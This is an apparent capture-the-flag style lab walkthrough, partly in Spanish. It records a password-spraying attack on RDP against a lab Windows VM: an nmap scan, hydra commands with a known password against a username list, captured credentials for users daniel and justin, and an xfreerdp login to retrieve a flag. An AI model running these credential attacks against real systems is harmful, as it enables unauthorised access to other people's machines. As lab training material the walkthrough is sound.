# Walk: Password Attacks - SSH and RDP - VM #2

## Fecha: 19/02/2025
## Host: Windows
## IP: 192.168.202.202
## Objetivo
Follow the steps outlined in this section to leverage a dictionary attack to gain access to RDP on VM #2 (BRUTE2). Find the flag on either one of the user's desktops. To reduce the time it takes to perform the password spraying, you can create a list with the two usernames: _justin_ and _daniel_.
## Herramientas
1. nmap
2. hydra
## Procedimiento y comandos
#### Paso 1: Escanemos el host para enumerar servicios ssh:
- `nmap -sV --open -oN vm-1.nmap-result.txt 192.168.202.202`
```
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           FileZilla ftpd 1.4.1
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8000/tcp open  http          Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
#### Paso 2: Ejecutamos el ataque de diccionario con hydra:
- `hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" -s 3389 rdp://192.168.202.202`
```
un paquete de doritos despues > > >
...
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:14344399/p:1), ~3586100 tries per task
[DATA] attacking rdp://192.168.202.202:3389/
...
[3389][rdp] host: 192.168.202.202 login: daniel password: SuperS3cure1337#
[ERROR] freerdp: The connection failed to establish.
[3389][rdp] host: 192.168.202.202 login: justin password: SuperS3cure1337#
[ERROR] freerdp: The connection failed to establish.
...
```
- Podemos crear una lista con los dos usuarios:
	- `echo "justin\ndaniel" > users.txt`
	- ` hydra -L users.txt -p "SuperS3cure1337#" -s 3389 rdp://192.168.202.202`

#### Paso 3: Nos conectamos por rdp con el usuario daniel:
- ` xfreerdp /v:192.168.202.202 /u:daniel /p:SuperS3cure1337# +clipboard /cert:ignore`
- Obtenemos el flag.
